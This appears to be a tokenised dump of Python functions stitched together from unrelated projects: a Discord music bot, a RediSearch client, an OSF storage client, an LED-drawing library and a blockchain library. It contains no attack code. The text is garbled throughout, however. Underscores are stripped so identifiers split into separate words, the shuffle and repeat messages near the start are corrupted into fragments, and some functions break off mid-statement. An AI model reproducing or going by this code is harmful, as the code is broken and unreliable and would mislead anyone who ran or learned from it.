async def shuffle ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . is playing : return await ctx . send ( 'Nothing playing.' ) player . shuffle = not player . shuffle await ctx . send ( ' | Shuffle ' +  ' n abled' if pl yer.sh u ffle el e 'd
async def repeat ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . is playing : return await ctx . send ( 'Nothing playing.' ) player . repeat = not player . repeat await ctx . send ( ' | Repeat ' +  ' n abled' if pl yer.re p eat el e 'd
async def remove ( self , ctx , index : int ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . queue : return await ctx . send ( 'Nothing queued.' ) if index > len ( player . queue ) or index < 1 : return await ctx . send ( f'Index has to be **between** 1 and {len(player.queue)}' ) index -= 1 removed = player . queue . pop ( index ) await ctx . send ( f'Removed **{removed.title}** from the queue.' )
async def disconnect ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . is connected : return await ctx . send ( 'Not connected.' ) if not ctx . author . voice or ( player . is connected and ctx . author . voice . channel . id != int ( player . channel id ) ) : return await ctx . send ( 'You\'re not in my voicechannel!' ) player . queue . clear ( ) await player . disconnect ( ) await ctx . send (
async def ensure voice ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . is connected : if not ctx . author . voice or not ctx . author . voice . channel : await ctx . send ( 'You aren\'t connected to any voice channel.' ) raise commands . Command Invoke Error ( 'Author not connected to voice channel.' ) permissions = ctx . author . voice . channel . permissions for ( ctx . me ) if not permissions . connect or not permissions . speak : await ctx . send ( 'Missing permissions `CONNECT` and/or `SPEAK`.' ) raise commands . Command Invoke Error ( 'Bot has no permissions CONNECT and/or SPEAK' ) player . store ( 'channel' , ctx . channel . id ) await player . connect ( ctx . author . voice . channel . id ) else : if player . connected channel . id != ctx . author . voice . channel . id : return await ctx . send ( 'Join my voice channel!' )
def unregister hook ( self , func ) : if func in self . hooks : self . hooks . remove ( func )
async def dispatch event ( self , event ) : log . debug ( 'Dispatching event of type {} to {} hooks' . format ( event . class . name , len ( self . hooks ) ) ) for hook in self . hooks : try : if asyncio . iscoroutinefunction ( hook ) : await hook ( event ) else : hook ( event ) except Exception as e : log . warning ( 'Encountered exception while dispatching an event to hook `{}` ({})' . format ( hook . name , str ( e ) ) ) if isinstance ( event , ( Track End Event , Track Exception Event , Track Stuck Event ) ) and event . player : await event . player . handle event ( event )
async def update state ( self , data ) : guild id = int ( data [ 'guild Id' ] ) if guild id in self . players : player = self . players . get ( guild id ) player . position = data [ 'state' ] . get ( 'position' , 0 ) player . position timestamp = data [ 'state' ] [ 'time' ]
async def get tracks ( self , query ) : log . debug ( 'Requesting tracks for query {}' . format ( query ) ) async with self . http . get ( self . rest uri + quote ( query ) , headers = { 'Authorization' : self . password } ) as res : return await res . json ( content type = None )
def destroy ( self ) : self . ws . destroy ( ) self . bot . remove listener ( self . on socket response ) self . hooks . clear ( )
def build ( self , track , requester ) : try : self . track = track [ 'track' ] self . identifier = track [ 'info' ] [ 'identifier' ] self . can seek = track [ 'info' ] [ 'is Seekable' ] self . author = track [ 'info' ] [ 'author' ] self . duration = track [ 'info' ] [ 'length' ] self . stream = track [ 'info' ] [ 'is Stream' ] self . title = track [ 'info' ] [ 'title' ] self . uri = track [ 'info' ] [ 'uri' ] self . requester = requester return self except Key Error : raise Invalid Track ( 'An invalid track was passed.' )
async def previous ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) try : await player . play previous ( ) except lavalink . No Previous Track : await ctx . send ( 'There is no previous song to play.' )
async def playnow ( self , ctx , * , query : str ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . queue and not player . is playing : return await ctx . invoke ( self . play , query = query ) query = query . strip ( '<>' ) if not url rx . match ( query ) : query = f'ytsearch:{query}' results = await self . bot . lavalink . get tracks ( query ) if not results or not results [ 'tracks' ] : return await ctx . send ( 'Nothing found!' ) tracks = results [ 'tracks' ] track = tracks . pop ( 0 ) if results [ 'load Type' ] == 'PLAYLIST LOADED' : for track in tracks : player . add ( requester = ctx . author . id , track = track ) await player . play now ( requester = ctx . author . id , track = track )
async def playat ( self , ctx , index : int ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if index < 1 : return await ctx . send ( 'Invalid specified index.' ) if len ( player . queue ) < index : return await ctx . send ( 'This index exceeds the queue\'s length.' ) await player . play at ( index - 1 )
async def find ( self , ctx , * , query ) : if not query . startswith ( 'ytsearch:' ) and not query . startswith ( 'scsearch:' ) : query = 'ytsearch:' + query results = await self . bot . lavalink . get tracks ( query ) if not results or not results [ 'tracks' ] : return await ctx . send ( 'Nothing found' ) tracks = results [ 'tracks' ] [ : 10 ] o = '' for index , track in enumerate ( tracks , start = 1 ) : track title = track [ "info" ] [ "title" ] track uri = track [ "info" ] [ "uri" ] o += f'`{index}.` [{track title}]({track uri})\n' embed = discord . Embed ( color = discord . Color . blurple ( ) , description = o ) await ctx . send ( embed = embed )
def add document ( self , doc id , conn = None , nosave = False , score = 1.0 , payload = None , replace = False , partial = False , language = None , * * fields ) : if conn is None : conn = self . redis if partial : replace = True args = [ self . ADD CMD , self . index name , doc id , score ] if nosave : args . append ( 'NOSAVE' ) if payload is not None : args . append ( 'PAYLOAD' ) args . append ( payload ) if replace : args . append ( 'REPLACE' ) if partial : args . append ( 'PARTIAL' ) if language : args += [ 'LANGUAGE' , language ] args . append ( 'FIELDS' ) args += list ( itertools . chain ( * fields . items ( ) ) ) return conn . execute command ( * args )
def load document ( self , id ) : fields = self . redis . hgetall ( id ) if six . PY3 : f2 = { to string ( k ) : to string ( v ) for k , v in fields . items ( ) } fields = f2 try : del fields [ 'id' ] except Key Error : pass return Document ( id = id , * * fields )
def info ( self ) : res = self . redis . execute command ( 'FT.INFO' , self . index name ) it = six . moves . map ( to string , res ) return dict ( six . moves . zip ( it , it ) )
def get args ( self ) : args = [ self . query string ] if self . no content : args . append ( 'NOCONTENT' ) if self . fields : args . append ( 'INFIELDS' ) args . append ( len ( self . fields ) ) args += self . fields if self . verbatim : args . append ( 'VERBATIM' ) if self . no stopwords : args . append ( 'NOSTOPWORDS' ) if self . filters : for flt in self . filters : assert isinstance ( flt , Filter ) args += flt . args if self . with payloads : args . append ( 'WITHPAYLOADS' ) if self . ids : args . append ( 'INKEYS' ) args . append ( len ( self . ids ) ) args += self . ids if self . slop >= 0 : args += [ 'SLOP' , self . slop ] if self . in order : args . append ( 'INORDER' ) if self . return fields : args . append ( 'RETURN' ) args . append ( len ( self . return fields ) ) args += self . return fields if self . sortby : assert isinstance ( self . sortby , Sortby Field ) args . append ( 'SORTBY' ) args += self . sortby . args if self . language : args += [ 'LANGUAGE' , self . language ] args += self . summarize fields + self . highlight fields args += [ "LIMIT" , self . offset , self . num ] return args
def between ( a , b , inclusive min = True , inclusive max = True ) : return Range Value ( a , b , inclusive min = inclusive min , inclusive max = inclusive max )
def geo ( lat , lon , radius , unit = 'km' ) : return Geo Value ( lat , lon , radius , unit )
def reconstruct ( params ) : if isinstance ( params , dict ) : if ' class ' in params : cls = params [ ' class ' ] data = reconstruct ( params [ 'params' ] ) return cls ( * * data ) else : data = dict ( ) for key , value in six . iteritems ( params ) : data [ key ] = reconstruct ( value ) return data elif isinstance ( params , ( list , tuple ) ) : return [ reconstruct ( v ) for v in params ] else : return params
def get param names ( cls ) : init = cls . init args , varargs = inspect . getargspec ( init ) [ : 2 ] if varargs is not None : raise Runtime Error ( 'Base Transformer objects cannot have varargs' ) args . pop ( 0 ) args . sort ( ) return args
def get params ( self ) : out = { } out [ ' class ' ] = self . class out [ 'params' ] = dict ( steps = [ ] ) for name , step in self . steps : out [ 'params' ] [ 'steps' ] . append ( [ name , step . get params ( deep = True ) ] ) return out
def recursive transform ( self , jam , steps ) : if len ( steps ) > 0 : head transformer = steps [ 0 ] [ 1 ] for t jam in head transformer . transform ( jam ) : for q in self . recursive transform ( t jam , steps [ 1 : ] ) : yield q else : yield jam
def serial transform ( self , jam , steps ) : # This uses the round-robin itertools recipe if six . PY2 : attr = 'next' else : attr = ' next ' pending = len ( steps ) nexts = itertools . cycle ( getattr ( iter ( D . transform ( jam ) ) , attr ) for ( name , D ) in steps ) while pending : try : for next jam in nexts : yield next jam ( ) except Stop Iteration : pending -= 1 nexts = itertools . cycle ( itertools . islice ( nexts , pending ) )
def file empty ( fp ) : # for python 2 we need to use a homemade peek() if six . PY2 : contents = fp . read ( ) fp . seek ( 0 ) return not bool ( contents ) else : return not fp . peek ( )
def storage ( self , provider = 'osfstorage' ) : stores = self . json ( self . get ( self . storages url ) , 200 ) stores = stores [ 'data' ] for store in stores : provides = self . get attribute ( store , 'attributes' , 'provider' ) if provides == provider : return Storage ( store , self . session ) raise Runtime Error ( "Project has no storage " "provider '{}'" . format ( provider ) )
def storages ( self ) : stores = self . json ( self . get ( self . storages url ) , 200 ) stores = stores [ 'data' ] for store in stores : yield Storage ( store , self . session )
def remove ( self ) : response = self . delete ( self . delete url ) if response . status code != 204 : raise Runtime Error ( 'Could not delete {}.' . format ( self . path ) )
def init ( args ) : # reading existing config file, convert to configparser object config = config from file ( ) config = configparser . Config Parser ( ) config . add section ( 'osf' ) if 'username' not in config . keys ( ) : config . set ( 'osf' , 'username' , '' ) else : config . set ( 'osf' , 'username' , config [ 'username' ] ) if 'project' not in config . keys ( ) : config . set ( 'osf' , 'project' , '' ) else : config . set ( 'osf' , 'project' , config [ 'project' ] ) # now we can start asking for new values print ( 'Provide a username for the config file [current username: {}]:' . format ( config . get ( 'osf' , 'username' ) ) ) username = input ( ) if username : config . set ( 'osf' , 'username' , username ) print ( 'Provide a project for the config file [current project: {}]:' . format ( config . get ( 'osf' , 'project' ) ) ) project = input ( ) if project : config . set ( 'osf' , 'project' , project ) cfgfile = open ( ".osfcli.config" , "w" ) config . write ( cfgfile ) cfgfile . close ( )
def login ( self , username , password = None , token = None ) : self . session . basic auth ( username , password )
def project ( self , project id ) : type = self . guid ( project id ) url = self . build url ( type , project id ) if type in Project . types : return Project ( self . json ( self . get ( url ) , 200 ) , self . session ) raise OSF Exception ( '{} is unrecognized type {}. Clone supports projects and registrations' . format ( project id , type ) )
def guid ( self , guid ) : return self . json ( self . get ( self . build url ( 'guids' , guid ) ) , 200 ) [ 'data' ] [ 'type' ]
def json ( self , response , status code ) : if isinstance ( status code , numbers . Integral ) : status code = ( status code , ) if response . status code in status code : return response . json ( ) else : raise Runtime Error ( "Response has status " "code {} not {}" . format ( response . status code , status code ) )
def follow next ( self , url ) : response = self . json ( self . get ( url ) , 200 ) data = response [ 'data' ] next url = self . get attribute ( response , 'links' , 'next' ) while next url is not None : response = self . json ( self . get ( next url ) , 200 ) data . extend ( response [ 'data' ] ) next url = self . get attribute ( response , 'links' , 'next' ) return data
def clear ( self ) : self . desc = { } for key , value in merge . DEFAULT PROJECT . items ( ) : if key not in self . HIDDEN : self . desc [ key ] = type ( value ) ( )
def error ( self , fail = True , action = '' ) : e = 'There was an unknown error communicating with the device.' if action : e = 'While %s: %s' % ( action , e ) log . error ( e ) if fail : raise IO Error ( e )
def crop ( image , top offset = 0 , left offset = 0 , bottom offset = 0 , right offset = 0 ) : if bottom offset or top offset or left offset or right offset : width , height = image . size box = ( left offset , top offset , width - right offset , height - bottom offset ) image = image . crop ( box = box ) return image
def resize ( image , x , y , stretch = False , top = None , left = None , mode = 'RGB' , resample = None ) : if x <= 0 : raise Value Error ( 'x must be greater than zero' ) if y <= 0 : raise Value Error ( 'y must be greater than zero' ) from PIL import Image resample = Image . ANTIALIAS if resample is None else resample if not isinstance ( resample , numbers . Number ) : try : resample = getattr ( Image , resample . upper ( ) ) except : raise Value Error ( "(1) Didn't understand resample=%s" % resample ) if not isinstance ( resample , numbers . Number ) : raise Value Error ( "(2) Didn't understand resample=%s" % resample ) size = x , y if stretch : return image . resize ( size , resample = resample ) result = Image . new ( mode , size ) ratios = [ d1 / d2 for d1 , d2 in zip ( size , image . size ) ] if ratios [ 0 ] < ratios [ 1 ] : new size = ( size [ 0 ] , int ( image . size [ 1 ] * ratios [ 0 ] ) ) else : new size = ( int ( image . size [ 0 ] * ratios [ 1 ] ) , size [ 1 ] ) image = image . resize ( new size , resample = resample ) if left is None : box x = int ( ( x - new size [ 0 ] ) / 2 ) elif left : box x = 0 else : box x = x - new size [ 0 ] if top is None : box y = int ( ( y - new size [ 1 ] ) / 2 ) elif top : box y = 0 else : box y = y - new size [ 1 ] result . paste ( image , box = ( box x , box y ) ) return result
def draw Circle ( self , x0 , y0 , r , color = None ) : md . draw circle ( self . set , x0 , y0 , r , color )
def fill Circle ( self , x0 , y0 , r , color = None ) : md . fill circle ( self . set , x0 , y0 , r , color )
def fill Screen ( self , color = None ) : md . fill rect ( self . set , 0 , 0 , self . width , self . height , color )
def set project ( self , project ) : def visit ( x ) : # Try to set project, then recurse through any values() set project = getattr ( x , 'set project' , None ) if set project : set project ( project ) values = getattr ( x , 'values' , lambda : ( ) ) for v in values ( ) : visit ( v ) visit ( self . routing )
def set ( self , ring , angle , color ) : pixel = self . angle To Pixel ( angle , ring ) self . set base ( pixel , color )
def get ( self , ring , angle ) : pixel = self . angle To Pixel ( angle , ring ) return self . get base ( pixel )
def color scale ( color , level ) : return tuple ( [ int ( i * level ) >> 8 for i in list ( color ) ] )
def save ( self , project file = '' ) : self . request project file ( project file ) data file . dump ( self . desc . as dict ( ) , self . project file )
def run ( self , next task ) : self . event . wait ( ) self . task ( ) self . event . clear ( ) next task . event . set ( )
def report ( function , * args , * * kwds ) : try : function ( * args , * * kwds ) except Exception : traceback . print exc ( )
def receive ( self , msg ) : msg = self . convert ( msg ) if msg is None : return str msg = self . verbose and self . msg to str ( msg ) if self . verbose and log . is debug ( ) : log . debug ( 'Message %s' , str msg ) if self . pre routing : self . pre routing . receive ( msg ) receiver , msg = self . routing . receive ( msg ) if receiver : receiver . receive ( msg ) if self . verbose : log . info ( 'Routed message %s (%s) to %s' , str msg [ : 128 ] , msg , repr ( receiver ) )
def set RGB ( self , pixel , r , g , b ) : self . set base ( pixel , ( r , g , b ) )
def set HSV ( self , pixel , hsv ) : color = conversions . hsv2rgb ( hsv ) self . set base ( pixel , color )
def fill ( self , color , start = 0 , end = - 1 ) : start = max ( start , 0 ) if end < 0 or end >= self . num LE Ds : end = self . num LE Ds - 1 for led in range ( start , end + 1 ) : # since 0-index include end in range self . set base ( led , color )
def fill RGB ( self , r , g , b , start = 0 , end = - 1 ) : self . fill ( ( r , g , b ) , start , end )
def fill HSV ( self , hsv , start = 0 , end = - 1 ) : self . fill ( conversions . hsv2rgb ( hsv ) , start , end )
def single ( method ) : @ functools . wraps ( method ) def single ( self , address , value = None ) : address = urllib . parse . unquote plus ( address ) try : error = NO PROJECT ERROR if not self . project : raise Value Error error = BAD ADDRESS ERROR ed = editor . Editor ( address , self . project ) if value is None : error = BAD GETTER ERROR result = method ( self , ed ) else : error = BAD SETTER ERROR result = method ( self , ed , value ) result = { 'value' : result } except Exception as e : traceback . print exc ( ) msg = '%s\n%s' % ( error . format ( * * locals ( ) ) , e ) result = { 'error' : msg } return flask . jsonify ( result ) return single
def multi ( method ) : @ functools . wraps ( method ) def multi ( self , address = '' ) : values = flask . request . values address = urllib . parse . unquote plus ( address ) if address and values and not address . endswith ( '.' ) : address += '.' result = { } for a in values or '' : try : if not self . project : raise Value Error ( 'No Project is currently loaded' ) ed = editor . Editor ( address + a , self . project ) result [ address + a ] = { 'value' : method ( self , ed , a ) } except : if self . project : traceback . print exc ( ) result [ address + a ] = { 'error' : 'Could not multi addr %s' % a } return flask . jsonify ( result ) return multi
def set RGB ( self , pixel , r , g , b ) : self . set ( pixel , ( r , g , b ) )
def set HSV ( self , pixel , hsv ) : color = conversions . hsv2rgb ( hsv ) self . set ( pixel , color )
def draw circle ( setter , x0 , y0 , r , color = None ) : f = 1 - r dd F x = 1 dd F y = - 2 * r x = 0 y = r setter ( x0 , y0 + r , color ) setter ( x0 , y0 - r , color ) setter ( x0 + r , y0 , color ) setter ( x0 - r , y0 , color ) while x < y : if f >= 0 : y -= 1 dd F y += 2 f += dd F y x += 1 dd F x += 2 f += dd F x setter ( x0 + x , y0 + y , color ) setter ( x0 - x , y0 + y , color ) setter ( x0 + x , y0 - y , color ) setter ( x0 - x , y0 - y , color ) setter ( x0 + y , y0 + x , color ) setter ( x0 - y , y0 + x , color ) setter ( x0 + y , y0 - x , color ) setter ( x0 - y , y0 - x , color )
def fill circle ( setter , x0 , y0 , r , color = None ) : draw fast vline ( setter , x0 , y0 - r , 2 * r + 1 , color ) fill circle helper ( setter , x0 , y0 , r , 3 , 0 , color )
def bresenham line ( setter , x0 , y0 , x1 , y1 , color = None , color Func = None ) : steep = abs ( y1 - y0 ) > abs ( x1 - x0 ) if steep : x0 , y0 = y0 , x0 x1 , y1 = y1 , x1 if x0 > x1 : x0 , x1 = x1 , x0 y0 , y1 = y1 , y0 dx = x1 - x0 dy = abs ( y1 - y0 ) err = dx / 2 if y0 < y1 : ystep = 1 else : ystep = - 1 count = 0 for x in range ( x0 , x1 + 1 ) : if color Func : color = color Func ( count ) count += 1 if steep : setter ( y0 , x , color ) else : setter ( x , y0 , color ) err -= dy if err < 0 : y0 += ystep err += dx
def draw rect ( setter , x , y , w , h , color = None , aa = False ) : draw fast hline ( setter , x , y , w , color , aa ) draw fast hline ( setter , x , y + h - 1 , w , color , aa ) draw fast vline ( setter , x , y , h , color , aa ) draw fast vline ( setter , x + w - 1 , y , h , color , aa )
def fill rect ( setter , x , y , w , h , color = None , aa = False ) : for i in range ( x , x + w ) : draw fast vline ( setter , i , y , h , color , aa )
def draw triangle ( setter , x0 , y0 , x1 , y1 , x2 , y2 , color = None , aa = False ) : draw line ( setter , x0 , y0 , x1 , y1 , color , aa ) draw line ( setter , x1 , y1 , x2 , y2 , color , aa ) draw line ( setter , x2 , y2 , x0 , y0 , color , aa )
def fill triangle ( setter , x0 , y0 , x1 , y1 , x2 , y2 , color = None , aa = False ) : a = b = y = last = 0 if y0 > y1 : y0 , y1 = y1 , y0 x0 , x1 = x1 , x0 if y1 > y2 : y2 , y1 = y1 , y2 x2 , x1 = x1 , x2 if y0 > y1 : y0 , y1 = y1 , y0 x0 , x1 = x1 , x0 if y0 == y2 : # Handle awkward all-on-same-line case as its own thing a = b = x0 if x1 < a : a = x1 elif x1 > b : b = x1 if x2 < a : a = x2 elif x2 > b : b = x2 draw fast hline ( setter , a , y0 , b - a + 1 , color , aa ) dx01 = x1 - x0 dy01 = y1 - y0 dx02 = x2 - x0 dy02 = y2 - y0 dx12 = x2 - x1 dy12 = y2 - y1 sa = 0 sb = 0 # For upper part of triangle, find scanline crossings for segments # 0-1 and 0-2.  If y1=y2 (flat-bottomed triangle), the scanline y1 # is included here (and second loop will be skipped, avoiding a /0 # error there), otherwise scanline y1 is skipped here and handled # in the second loop...which also avoids a /0 error here if y0=y1 # (flat-topped triangle). if y1 == y2 : last = y1 # include y1 scanline else : last = y1 - 1 # skip it for y in range ( y , last + 1 ) : a = x0 + sa / dy01 b = x0 + sb / dy02 sa += dx01 sb += dx02 if a > b : a , b = b , a draw fast hline ( setter , a , y , b - a + 1 , color , aa ) # For lower part of triangle, find scanline crossings for segments # 0-2 and 1-2.  This loop is skipped if y1=y2. sa = dx12 * ( y - y1 ) sb = dx02 * ( y - y0 ) for y in range ( y , y2 + 1 ) : a = x1 + sa / dy12 b = x0 + sb / dy02 sa += dx12 sb += dx02 if a > b : a , b = b , a draw fast hline ( setter , a , y , b - a + 1 , color , aa )
def all named colors ( ) : yield from TO COLOR USER . items ( ) for name , color in TO COLOR . items ( ) : if name not in TO COLOR USER : yield name , color
def contains ( x ) : if isinstance ( x , str ) : x = canonical name ( x ) return x in TO COLOR USER or x in TO COLOR else : x = tuple ( x ) return x in TO NAME USER or x in TO NAME
def make segments ( strip , length ) : if len ( strip ) % length : raise Value Error ( 'The length of strip must be a multiple of length' ) s = [ ] try : while True : s . append ( s [ - 1 ] . next ( length ) if s else Segment ( strip , length ) ) except Value Error : return s
def next ( self , length ) : return Segment ( self . strip , length , self . offset + self . length )
def start ( self , threaded = None ) : if threaded is not None : self . threaded = threaded run = { 'run' : { 'threaded' : False } } self . project = project . project ( self . desc , run , root file = self . project file ) self . run = self . project . run self . runner . start ( self . threaded )
def stop ( self = None ) : if not self : instance = getattr ( Runner . instance ( ) , 'builder' , None ) self = instance and instance ( ) if not self : return self . runner . stop ( ) if self . project : self . project . stop ( ) self . project = None
def simpixel ( new = 0 , autoraise = True ) : simpixel driver . open browser ( new = new , autoraise = autoraise )
def euclidean ( c1 , c2 ) : diffs = ( ( i - j ) for i , j in zip ( c1 , c2 ) ) return sum ( x * x for x in diffs )
def set one ( desc , name , value ) : old value = desc . get ( name ) if old value is None : raise Key Error ( 'No section "%s"' % name ) if value is None : value = type ( old value ) ( ) elif name in CLASS SECTIONS : if isinstance ( value , str ) : value = { 'typename' : aliases . resolve ( value ) } elif isinstance ( value , type ) : value = { 'typename' : class name . class name ( value ) } elif not isinstance ( value , dict ) : raise Type Error ( 'Expected dict, str or type, got "%s"' % value ) typename = value . get ( 'typename' ) if typename : s = 's' if name == 'driver' else '' path = 'bibliopixel.' + name + s importer . import symbol ( typename , path ) elif name == 'shape' : if not isinstance ( value , ( list , int , tuple , str ) ) : raise Type Error ( 'Expected shape, got "%s"' % value ) elif type ( old value ) is not type ( value ) : raise Type Error ( 'Expected %s but got "%s" of type %s' % ( type ( old value ) , value , type ( value ) ) ) desc [ name ] = value
def update ( desc , other = None , * * kwds ) : other = other and as dict ( other ) or { } for i in other , kwds : for k , v in i . items ( ) : if isinstance ( v , dict ) : # Only for dicts, merge instead of overwriting old v = desc [ k ] for k2 , v2 in v . items ( ) : if v2 is None : old v . pop ( k2 , None ) else : old v [ k2 ] = v2 else : set one ( desc , k , v )
def to color ( c ) : if isinstance ( c , numbers . Number ) : return c , c , c if not c : raise Value Error ( 'Cannot create color from empty "%s"' % c ) if isinstance ( c , str ) : return name to color ( c ) if isinstance ( c , list ) : c = tuple ( c ) if isinstance ( c , tuple ) : if len ( c ) > 3 : return c [ : 3 ] while len ( c ) < 3 : c += ( c [ - 1 ] , ) return c raise Value Error ( 'Cannot create color from "%s"' % c )
def convert mode ( image , mode = 'RGB' ) : deprecated . deprecated ( 'util.gif.convert model' ) return image if ( image . mode == mode ) else image . convert ( mode = mode )
def image to colorlist ( image , container = list ) : deprecated . deprecated ( 'util.gif.image to colorlist' ) return container ( convert mode ( image ) . getdata ( ) )
def animated gif to colorlists ( image , container = list ) : deprecated . deprecated ( 'util.gif.animated gif to colorlists' ) from PIL import Image Sequence it = Image Sequence . Iterator ( image ) return [ image to colorlist ( i , container ) for i in it ]
def opener ( ip address , port , delay = 1 ) : global WEBPAGE OPENED if WEBPAGE OPENED : return WEBPAGE OPENED = True raw opener ( ip address , port , delay )
def raw opener ( ip address , port , delay = 1 ) : def target ( ) : time . sleep ( delay ) url = 'http://%s:%d' % ( ip address , port ) webbrowser . open ( url , new = 0 , autoraise = True ) threading . Thread ( target = target , daemon = True ) . start ( )
def start ( self , threaded ) : self . stop ( ) self . class . INSTANCE = weakref . ref ( self ) self . is running = True if threaded : self . thread = runnable . Loop Thread ( ) self . thread . run once = self . target self . thread . start ( ) else : self . target ( )
def show image ( setter , width , height , image path = '' , image obj = None , offset = ( 0 , 0 ) , bgcolor = COLORS . Off , brightness = 255 ) : bgcolor = color scale ( bgcolor , brightness ) img = image obj if image path and not img : from PIL import Image img = Image . open ( image path ) elif not img : raise Value Error ( 'Must provide either image path or image obj' ) w = min ( width - offset [ 0 ] , img . size [ 0 ] ) h = min ( height - offset [ 1 ] , img . size [ 1 ] ) ox = offset [ 0 ] oy = offset [ 1 ] for x in range ( ox , w + ox ) : for y in range ( oy , h + oy ) : r , g , b , a = ( 0 , 0 , 0 , 255 ) rgba = img . getpixel ( ( x - ox , y - oy ) ) if isinstance ( rgba , int ) : raise Value Error ( 'Image must be in RGB or RGBA format!' ) if len ( rgba ) == 3 : r , g , b = rgba elif len ( rgba ) == 4 : r , g , b , a = rgba else : raise Value Error ( 'Image must be in RGB or RGBA format!' ) if a == 0 : r , g , b = bgcolor else : r , g , b = color scale ( ( r , g , b ) , a ) if brightness != 255 : r , g , b = color scale ( ( r , g , b ) , brightness ) setter ( x , y , ( r , g , b ) )
def show Image ( layout , image Path = "" , image Obj = None , offset = ( 0 , 0 ) , bgcolor = COLORS . Off , brightness = 255 ) : if not isinstance ( layout , Matrix ) : raise Runtime Error ( "Must use Matrix with show Image!" ) layout . all off ( ) return show image ( layout . set , layout . width , layout . height , image Path , image Obj , offset , bgcolor , brightness )
def load Image ( layout , image Path = "" , image Obj = None , offset = ( 0 , 0 ) , bgcolor = COLORS . Off , brightness = 255 ) : if not isinstance ( layout , Matrix ) : raise Runtime Error ( "Must use Matrix with load Image!" ) texture = [ [ COLORS . Off for x in range ( layout . width ) ] for y in range ( layout . height ) ] def setter ( x , y , pixel ) : if y >= 0 and x >= 0 : texture [ y ] [ x ] = pixel show image ( setter , layout . width , layout . height , image Path , image Obj , offset , bgcolor , brightness ) return texture
def serpentine x ( x , y , matrix ) : if y % 2 : return matrix . columns - 1 - x , y return x , y
def serpentine y ( x , y , matrix ) : if x % 2 : return x , matrix . rows - 1 - y return x , y
def colors no palette ( colors = None , * * kwds ) : if isinstance ( colors , str ) : colors = split colors ( colors ) else : colors = to triplets ( colors or ( ) ) colors = ( color ( c ) for c in colors or ( ) ) return palette . Palette ( colors , * * kwds )
def make matrix coord map ( dx , dy , serpentine = True , offset = 0 , rotation = 0 , y flip = False ) : result = [ ] for y in range ( dy ) : if not serpentine or y % 2 == 0 : result . append ( [ ( dx * y ) + x + offset for x in range ( dx ) ] ) else : result . append ( [ dx * ( y + 1 ) - 1 - x + offset for x in range ( dx ) ] ) result = rotate and flip ( result , rotation , y flip ) return result
def make object ( * args , typename = None , python path = None , datatype = None , * * kwds ) : datatype = datatype or import symbol ( typename , python path ) field types = getattr ( datatype , 'FIELD TYPES' , fields . FIELD TYPES ) return datatype ( * args , * * fields . component ( kwds , field types ) )
def index ( self , i , length = None ) : if self . begin <= i <= self . end : index = i - self . BEGIN - self . offset if length is None : length = self . full range ( ) else : length = min ( length , self . full range ( ) ) if 0 <= index < length : return index
def copy ( self ) : return self . class ( amount = self [ "amount" ] , asset = self [ "asset" ] . copy ( ) , blockchain instance = self . blockchain , )
def upgrade ( self ) : # pragma: no cover assert callable ( self . blockchain . upgrade account ) return self . blockchain . upgrade account ( account = self )
def whitelist ( self , account ) : # pragma: no cover assert callable ( self . blockchain . account whitelist ) return self . blockchain . account whitelist ( account , lists = [ "white" ] , account = self )
def blacklist ( self , account ) : # pragma: no cover assert callable ( self . blockchain . account whitelist ) return self . blockchain . account whitelist ( account , lists = [ "black" ] , account = self )
def nolist ( self , account ) : # pragma: no cover assert callable ( self . blockchain . account whitelist ) return self . blockchain . account whitelist ( account , lists = [ ] , account = self )
def recover public key ( digest , signature , i , message = None ) : # See http: //www.secg.org/download/aid-780/sec1-v2.pdf section 4.1.6 primarily curve = ecdsa . SECP256k1 . curve G = ecdsa . SECP256k1 . generator order = ecdsa . SECP256k1 . order yp = i % 2 r , s = ecdsa . util . sigdecode string ( signature , order ) # 1.1 x = r + ( i // 2 ) * order # 1.3. This actually calculates for either effectively 02||X or 03||X depending on 'k' instead of always for 02||X as specified. # This substitutes for the lack of reversing R later on. -R actually is defined to be just flipping the y-coordinate in the elliptic curve. alpha = ( ( x * x * x ) + ( curve . a ( ) * x ) + curve . b ( ) ) % curve . p ( ) beta = ecdsa . numbertheory . square root mod prime ( alpha , curve . p ( ) ) y = beta if ( beta - yp ) % 2 == 0 else curve . p ( ) - beta # 1.4 Constructor of Point is supposed to check if n R is at infinity. R = ecdsa . ellipticcurve . Point ( curve , x , y , order ) # 1.5 Compute e e = ecdsa . util . string to number ( digest ) # 1.6 Compute Q = r^-1(s R - e G) Q = ecdsa . numbertheory . inverse mod ( r , order ) * ( s * R + ( - e % order ) * G ) if SECP256K1 MODULE == "cryptography" and message is not None : if not isinstance ( message , bytes ) : message = bytes ( message , "utf-8" ) # pragma: no cover sigder = encode dss signature ( r , s ) public key = ec . Elliptic Curve Public Numbers ( Q . Point x , Q . Point y , ec . SECP256K1 ( ) ) . public key ( default backend ( ) ) public key . verify ( sigder , message , ec . ECDSA ( hashes . SHA256 ( ) ) ) return public key else : # Not strictly necessary, but let's verify the message for paranoia's sake. if not ecdsa . Verifying Key . from public point ( Q , curve = ecdsa . SECP256k1 ) . verify digest ( signature , digest , sigdecode = ecdsa . util . sigdecode string ) : # pragma: no cover return None # pragma: no cover return ecdsa . Verifying Key . from public point ( Q , curve = ecdsa . SECP256k1 )
def refresh ( self ) : asset = self . blockchain . rpc . get asset ( self . identifier ) if not asset : raise Asset Does Not Exists Exception ( self . identifier ) super ( Asset , self ) . init ( asset , blockchain instance = self . blockchain ) if self . full : if "bitasset data id" in asset : self [ "bitasset data" ] = self . blockchain . rpc . get object ( asset [ "bitasset data id" ] ) self [ "dynamic asset data" ] = self . blockchain . rpc . get object ( asset [ "dynamic asset data id" ] )
def format Time ( t ) : if isinstance ( t , float ) : return datetime . utcfromtimestamp ( t ) . strftime ( time Format ) if isinstance ( t , datetime ) : return t . strftime ( time Format )
def get Operation Name For Id ( i : int ) : assert isinstance ( i , ( int ) ) , "This method expects an integer argument" for key in operations : if int ( operations [ key ] ) is int ( i ) : return key raise Value Error ( "Unknown Operation ID %d" % i )
